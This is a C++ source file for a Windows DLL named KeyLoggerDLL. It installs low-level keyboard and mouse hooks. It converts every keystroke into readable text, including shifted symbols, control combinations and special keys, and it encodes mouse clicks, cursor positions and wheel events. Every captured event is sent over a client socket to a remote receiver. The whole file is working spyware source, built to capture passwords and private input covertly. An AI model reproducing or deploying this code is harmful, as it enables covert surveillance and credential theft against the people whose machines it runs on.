// KeyLoggerDLL.cpp : Defines the entry point for the DLL application.
#include "KeyLoggerDLL.h"
#include <iostream>
#include <Windows.h>

using namespace std;

BOOL APIENTRY KeyLoggerDLL(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

// KeyLoggerDLL.cpp : Defines the exported functions for the DLL application.
//

void CheckKeyState()
{
	if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
		caps_on = true;
	else
		caps_on = false;
}

DLLExport void Init()
{
	shift_on = false;
	ctrl_on = false;
	screen_x = GetSystemMetrics(SM_CXSCREEN);
	screen_y = GetSystemMetrics(SM_CYSCREEN);
}

DLLExport void SetHooks(HHOOK* keyboard_hook, HHOOK* mouse_hook)
{
	kb_hook = keyboard_hook;
	ms_hook = mouse_hook;
}

DLLExport void SetClient(ClientSocket * client_socket)
{
	client = client_socket;
}

DLLExport LRESULT _stdcall key_proc(int nCode, WPARAM wParam, LPARAM lParam)
{
	KBDLLHOOKSTRUCT kb_struct = *((KBDLLHOOKSTRUCT*)lParam);
	int in;
	char cur_char;
	string key_event = "K";
	in = kb_struct.vkCode;
	if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP)
	{
		if (in == VK_LSHIFT || in == VK_RSHIFT) { shift_on = false; }
		if (in == VK_LCONTROL || in == VK_RCONTROL) { ctrl_on = false; }
	}
	if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
	{
		// cout << hex << in;
		// /*
		if (in == VK_LSHIFT || in == VK_RSHIFT) { shift_on = true; }
		if (ctrl_on == true && in != VK_LCONTROL && in != VK_RCONTROL) { key_event += "<CTRL+"; }
		if (in == VK_LCONTROL || in == VK_RCONTROL) { ctrl_on = true; }
		// A to Z\:
		if (65 <= in && in <= 90)
		{
			cur_char = in;
			CheckKeyState();
			if (!(shift_on ^ caps_on)) key_event += tolower(cur_char);
			else key_event += cur_char;
		}
		switch (in)
		{
		case VK_BACK:
			key_event += "<backspace>";
			break;
		case VK_ESCAPE:
			key_event += "<esc>";
			break;
		case VK_LMENU:
			key_event += "<alt>";
			break;
		case VK_RMENU:
			key_event += "<alt>";
			break;
		case VK_LWIN:
			key_event += "<win-key>";
			break;
		case VK_RWIN:
			key_event += "<win-key>";
			break;
		case VK_APPS:
			key_event += "<menu-key>";
			break;
		case VK_PRIOR:
			key_event += "<page-up>";
			break;
		case VK_NEXT:
			key_event += "<page-down>";
			break;
		case VK_END:
			key_event += "<end>";
			break;
		case VK_HOME:
			key_event += "<home>";
			break;
		case VK_LEFT:
			key_event += "<left>";
			break;
		case VK_RIGHT:
			key_event += "<right>";
			break;
		case VK_UP:
			key_event += "<up>";
			break;
		case VK_DOWN:
			key_event += "<down>";
			break;
		case VK_INSERT:
			key_event += "<ins>";
			break;
		case VK_DELETE:
			key_event += "<del>";
			break;
		case VK_HELP:
			key_event += "<help>";
			break;
		case VK_PRINT:
			key_event += "<print>";
			break;
		case VK_SLEEP:
			key_event += "<sleep>";
			break;
		case VK_PAUSE:
			key_event += "<pause>";
			break;
		case VK_SNAPSHOT:
			key_event += "<print-screen>";
			break;
		case VK_SPACE:
			key_event += " ";
			break;
		case VK_RETURN:
			key_event += "<enter>";
			break;
		case VK_OEM_MINUS:
			if (shift_on == false) { key_event += "-"; }
			else { key_event += "_"; }
			break;
		case VK_OEM_PLUS:
			if (shift_on == false) { key_event += "="; }
			else { key_event += "+"; }
			break;
		case VK_OEM_1:
			if (shift_on == false) { key_event += ";"; }
			else { key_event += ":"; }
			break;
		case VK_OEM_2:
			if (shift_on == false) { key_event += "/"; }
			else { key_event += "\?"; }
			break;
		case VK_OEM_3:
			if (shift_on == false) { key_event += "`"; }
			else { key_event += "~"; }
			break;
		case VK_OEM_4:
			if (shift_on == false) { key_event += "["; }
			else { key_event += "{"; }
			break;
		case VK_OEM_5:
			if (shift_on == false) { key_event += "\\"; }
			else { key_event += "|"; }
			break;
		case VK_OEM_6:
			if (shift_on == false) { key_event += "]"; }
			else { key_event += "}"; }
			break;
		case VK_OEM_7:
			if (shift_on == false) { key_event += "\'"; }
			else { key_event += "\""; }
			break;
		case VK_OEM_PERIOD:
			if (shift_on == false) { key_event += "."; }
			else { key_event += ">"; }
			break;
		case VK_OEM_COMMA:
			if (shift_on == false) { key_event += ","; }
			else { key_event += "<"; }
			break;
		case VK_DIVIDE:
			key_event += "/";
			break;
		case VK_MULTIPLY:
			key_event += "*";
			break;
		case VK_SUBTRACT:
			key_event += "-";
			break;
		case VK_ADD:
			key_event += "+";
			break;
		case VK_DECIMAL:
			key_event += ".";
			break;
		case VK_TAB:
			key_event += "\t";
			break;
		}
		// Top Number Row:
		if (48 <= in && in <= 57)
		{
			if (shift_on == false)
			{
				char digit[2];
				sprintf_s(digit, 2, "%d", (in - 48));
				key_event += digit;
			}
			else
			{
				switch (in)
				{
				case 48:
					key_event += ")";
					break;
				case 49:
					key_event += "!";
					break;
				case 50:
					key_event += "@";
					break;
				case 51:
					key_event += "#";
					break;
				case 52:
					key_event += "$";
					break;
				case 53:
					key_event += "%";
					break;
				case 54:
					key_event += "^";
					break;
				case 55:
					key_event += "&";
					break;
				case 56:
					key_event += "*";
					break;
				case 57:
					key_event += "(";
					break;
				}
			}
		}
		// F-Keys:
		if (112 <= in && in <= 135)
		{
			char digit[10];
			sprintf_s(digit, 10, "<F%d>", (in - 111));
			key_event += digit;
		}
		// Left Number-Pad:
		if (96 <= in && in <= 105) { key_event += in - 96; }
		if (ctrl_on == true && in != VK_LCONTROL && in != VK_RCONTROL) { key_event += ">"; }
		// */

	}

	if (key_event != "K")
	{
		char* key_event_char = new char[key_event.length() + 1];
		strcpy_s(key_event_char, key_event.length() + 1, key_event.c_str());
		client->Send(key_event_char, key_event.length() + 1);
		delete[] key_event_char;
	}
	return CallNextHookEx(*kb_hook, nCode, wParam, lParam);
}

DLLExport LRESULT _stdcall mouse_proc(int nCode, WPARAM wParam, LPARAM lParam)
{
	MSLLHOOKSTRUCT ms_struct = *((MSLLHOOKSTRUCT*)lParam);
	string mouse_event = "M";
	char xy[10];
	int cursor_x = ((double)ms_struct.pt.x / screen_x) * 99;
	int cursor_y = ((double)ms_struct.pt.y / screen_y) * 99;
	if (cursor_x >= 10 && cursor_y >= 10) sprintf_s(xy, 10, "%i%i", cursor_x, cursor_y);
	else if (cursor_x < 10 && cursor_y >= 10) sprintf_s(xy, 10, "0%i%i", cursor_x, cursor_y);
	else if (cursor_x >= 10 && cursor_y < 10) sprintf_s(xy, 10, "%i0%i", cursor_x, cursor_y);
	else if (cursor_x < 10 && cursor_y < 10) sprintf_s(xy, 10, "0%i0%i", cursor_x, cursor_y);
	mouse_event += xy;
	switch ((int)wParam)
	{
	case WM_LBUTTONDOWN:
		mouse_event += "LD";
		break;
	case WM_LBUTTONUP:
		mouse_event += "LU";
		break;
	case WM_RBUTTONDOWN:
		mouse_event += "RD";
		break;
	case WM_RBUTTONUP:
		mouse_event += "RU";
		break;
	case WM_MOUSEMOVE:
		break;
	case WM_MOUSEWHEEL:
		mouse_event += "MW";
		// get Delta
		int d = (short)(ms_struct.mouseData >> 16) / 120;
		if (d > 0) mouse_event += "+";
		else if (d < 0) mouse_event += "-";
		break;
	}
	if (mouse_event != "M")
	{
		char* mouse_event_char = new char[mouse_event.length() + 1];
		strcpy_s(mouse_event_char, mouse_event.length() + 1, mouse_event.c_str());
		client->Send(mouse_event_char, mouse_event.length() + 1);
		delete[] mouse_event_char;
	}
	return CallNextHookEx(*ms_hook, nCode, wParam, lParam);

}